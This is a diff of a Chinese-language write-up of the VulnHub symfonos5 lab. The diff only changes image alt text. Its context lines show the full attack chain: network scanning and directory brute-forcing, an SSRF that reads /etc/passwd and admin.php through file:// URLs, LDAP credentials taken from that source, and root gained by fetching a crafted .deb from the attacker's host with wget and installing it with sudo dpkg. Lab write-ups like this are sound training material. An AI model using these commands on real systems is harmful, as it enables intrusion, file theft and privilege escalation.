@@ -40,7 +40,7 @@ Tested on VMware and Virtualbox
 nmap -sP 192.168.141.0/24
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/1.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/1.png)
 
 排除法,去掉自己、宿主机、网关, `192.168.141.151` 就是目标了
 
@@ -49,24 +49,24 @@ nmap -sP 192.168.141.0/24
 nmap -T5 -A -v -p- 192.168.141.151
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/2.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/2.png)
 
 SSH、web、ldap,ldap 一般比较少见,先从熟悉的 web 开始把
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/3.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/3.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/4.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/4.png)
 
 老样子,啥都没有,爆破目录,字典自 https://github.com/No-Github/AboutSecurity/blob/master/%E5%AD%97%E5%85%B8/Web%E5%AD%97%E5%85%B8/%E7%9B%AE%E5%BD%95/fast-scan.txt
 ```bash
 ./gobuster dir -u 192.168.141.151 -w fast-scan.txt
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/5.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/5.png)
 
 访问下这个 admin.php 和 home.php
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/6.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/6.png)
 
 home.php 会将我重定向到 admin.php,看看 html 源码
 
@@ -74,7 +74,7 @@ home.php 会将我重定向到 admin.php,看看 html 源码
 curl http://192.168.141.151/home.php
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/7.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/7.png)
 
 这个熟悉的 127.0.0.1 看上去是 ssrf 啊,读文件试试
 
@@ -84,14 +84,14 @@ curl http://192.168.141.151/home.php
 curl http://192.168.141.151/home.php\?url\=file:///etc/passwd
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/8.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/8.png)
 
 尝试读 admin.php 的源码
 ```
 curl http://192.168.141.151/home.php\?url\=file:///var/www/html/admin.php
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/9.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/9.png)
 
 看上去是 LDAP 的凭证。
 
@@ -99,9 +99,9 @@ ldap管理工具有 ldapadmin，JXplorer 等,这里就用 ladpadmin 测试了
 
 访问 https://sourceforge.net/projects/ldapadmin/ 下载安装包,我下的是windows版的,就不演示 linux 平台了
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/10.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/10.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/11.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/11.png)
 
 连接后可以看到有个 zeus 用户和其密码
 
@@ -115,7 +115,7 @@ SSH 连接上去,寻找提权的方法
 sudo -l
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/12.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/12.png)
 
 dpkg 以 root 权限运行,上 https://gtfobins.github.io/ 找下 dpkg 相关的内容
 
@@ -135,6 +135,6 @@ wget 192.168.141.134:8080/x_1.0_all.deb
 sudo dpkg -i x_1.0_all.deb
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/13.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos5/13.png)
 
 提权成功,感谢靶机作者 Zayotic,和 mzfr 分享的 writeup
